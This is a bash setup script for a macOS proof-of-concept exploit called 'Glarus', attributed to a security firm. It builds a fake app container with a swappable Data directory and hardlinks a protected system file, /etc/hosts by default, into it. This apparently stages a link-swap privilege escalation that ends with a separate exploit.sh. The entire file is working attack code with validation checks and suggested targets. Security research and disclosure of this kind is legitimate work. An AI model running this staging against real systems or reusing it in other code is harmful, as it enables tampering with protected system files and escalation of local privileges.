#!/bin/bash
#
# setup.sh - Glarus PoC Setup Script
#
# Creates the hardlink structure required for the exploit:
#
#   ~/Library/Containers/<bundle_id>/
#   ├── Data/           (real directory - will be swapped)
#   └── Fake/
#       └── tmp         (hardlink to target file)
#
# Copyright (c) 2025 Golden Helm Securities
#

set -e

# Use a simple fixed bundle ID
BUNDLE_ID="${GLARUS_BUNDLE_ID:-com.glarus.poc}"
CONTAINER_BASE="$HOME/Library/Containers/$BUNDLE_ID"
TARGET_FILE="${1:-/etc/hosts}"

echo "═══════════════════════════════════════════════════════════════"
echo "  Glarus PoC - Setup"
echo "═══════════════════════════════════════════════════════════════"
echo
echo "Bundle ID: $BUNDLE_ID"
echo "Container: $CONTAINER_BASE"
echo "Target:    $TARGET_FILE"
echo

#───────────────────────────────────────────────────────────────────────────────
# Validation
#───────────────────────────────────────────────────────────────────────────────

# Check target file exists
if [ ! -f "$TARGET_FILE" ]; then
    echo "ERROR: Target file does not exist: $TARGET_FILE"
    exit 1
fi
echo "[✓] Target file exists"

# Check we're not in a sandbox
if [ -n "$APP_SANDBOX_CONTAINER_ID" ]; then
    echo "ERROR: This script cannot run in a sandbox!"
    echo "       Run from Terminal.app or another unsandboxed process."
    exit 1
fi
echo "[✓] Running unsandboxed"

# Check filesystem compatibility (hardlinks can't cross filesystems)
TARGET_FS=$(df "$TARGET_FILE" 2>/dev/null | tail -1 | awk '{print $1}')
CONTAINER_FS=$(df "$HOME/Library" 2>/dev/null | tail -1 | awk '{print $1}')

if [ "$TARGET_FS" != "$CONTAINER_FS" ]; then
    echo "ERROR: Target file is on a different filesystem!"
    echo "       Target:    $TARGET_FS"
    echo "       Container: $CONTAINER_FS"
    echo "       Hardlinks cannot cross filesystem boundaries."
    exit 1
fi
echo "[✓] Same filesystem"

#───────────────────────────────────────────────────────────────────────────────
# Cleanup previous state
#───────────────────────────────────────────────────────────────────────────────

DATA_DIR="$CONTAINER_BASE/Data"
DATA_BACKUP="$CONTAINER_BASE/Data_backup"
FAKE_DIR="$CONTAINER_BASE/Fake"

# Remove Data symlink from previous run
if [ -L "$DATA_DIR" ]; then
    echo "[*] Removing leftover symlink..."
    rm -f "$DATA_DIR"
fi

# Remove Data_backup from previous run
if [ -d "$DATA_BACKUP" ]; then
    echo "[*] Removing leftover Data_backup..."
    rm -rf "$DATA_BACKUP"
fi

#───────────────────────────────────────────────────────────────────────────────
# Create directory structure
#───────────────────────────────────────────────────────────────────────────────

# Create container base
if [ ! -d "$CONTAINER_BASE" ]; then
    echo "[*] Creating container directory..."
    mkdir -p "$CONTAINER_BASE"
fi

# Create Data directory
if [ ! -d "$DATA_DIR" ]; then
    echo "[*] Creating Data directory..."
    mkdir -p "$DATA_DIR"
fi
echo "[✓] Data directory ready"

# Remove old Fake directory
if [ -e "$FAKE_DIR" ]; then
    echo "[*] Removing old Fake directory..."
    rm -rf "$FAKE_DIR"
fi

# Create Fake directory
echo "[*] Creating Fake directory..."
mkdir -p "$FAKE_DIR"

#───────────────────────────────────────────────────────────────────────────────
# Create hardlink
#───────────────────────────────────────────────────────────────────────────────

echo "[*] Creating hardlink to target file..."
if ! ln "$TARGET_FILE" "$FAKE_DIR/tmp" 2>/dev/null; then
    echo
    echo "ERROR: Failed to create hardlink!"
    echo
    echo "Possible causes:"
    echo "  • Target is SIP-protected (/System, /usr)"
    echo "  • Target is TCC-protected (some /etc files)"
    echo "  • Filesystem doesn't support hardlinks"
    echo
    echo "Try a different target:"
    echo "  ./scripts/setup.sh /etc/hosts"
    echo "  ./scripts/setup.sh /etc/newsyslog.conf"
    exit 1
fi

# Verify hardlink (same inode)
TARGET_INODE=$(stat -f "%i" "$TARGET_FILE" 2>/dev/null || stat -c "%i" "$TARGET_FILE")
FAKE_INODE=$(stat -f "%i" "$FAKE_DIR/tmp" 2>/dev/null || stat -c "%i" "$FAKE_DIR/tmp")

if [ "$TARGET_INODE" = "$FAKE_INODE" ]; then
    echo "[✓] Hardlink created successfully"
    echo
    echo "Verification:"
    echo "  Target inode:   $TARGET_INODE"
    echo "  Fake/tmp inode: $FAKE_INODE"
else
    echo "ERROR: Inode mismatch!"
    echo "  Target:   $TARGET_INODE"
    echo "  Fake/tmp: $FAKE_INODE"
    exit 1
fi

#───────────────────────────────────────────────────────────────────────────────
# Summary
#───────────────────────────────────────────────────────────────────────────────

echo
echo "═══════════════════════════════════════════════════════════════"
echo "  ✓ Setup Complete"
echo "═══════════════════════════════════════════════════════════════"
echo
echo "Directory structure:"
ls -la "$CONTAINER_BASE/"
echo
echo "Fake directory:"
ls -la "$FAKE_DIR/"
echo
echo "Target file current ownership:"
ls -la "$TARGET_FILE"
echo
echo "Next step: ./scripts/exploit.sh $TARGET_FILE"
echo
